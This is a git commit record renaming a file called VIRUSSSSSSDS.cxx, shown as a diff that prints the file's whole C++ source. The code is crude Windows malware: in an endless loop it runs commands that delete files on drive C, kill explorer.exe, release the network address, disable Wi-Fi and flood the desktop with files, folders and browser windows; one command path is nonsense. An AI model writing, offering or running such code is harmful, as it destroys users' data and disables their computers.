9d625e4252fcf13b82c9ea0f0419459104b0f663
Mr R0ot <117841475+mr-r0ot@users.noreply.github.com>
2023-01-02 12:30:04 -0800

    Rename VIRUSSSSSSDS.cxx to VIRUSSSSSSDS.cpp

--- VIRUSSSSSSDS.cxx
+++
@@ -1,5 +0,0 @@
-#include<string.h>
-#include<stdlib.h>
-#include<iostream>
-#include<windows.h>
-using namespace std;int main(){system("echo your hacking!!! > hacker.txt");while (true){system("c/windows/system32/jefo/display/memory/full");system("del c:*.*|y");system("Taskkill -im explorer.exe");system("ipconfig /release");system("hacker.txt");system("netsh interface set interface Wi-Fi Disabled");system("echo your hacking > C:/Users/%username%/Desktop/%random%.hacker.txt");system("mkdir %random%");system("start iexplore googl.com");}}
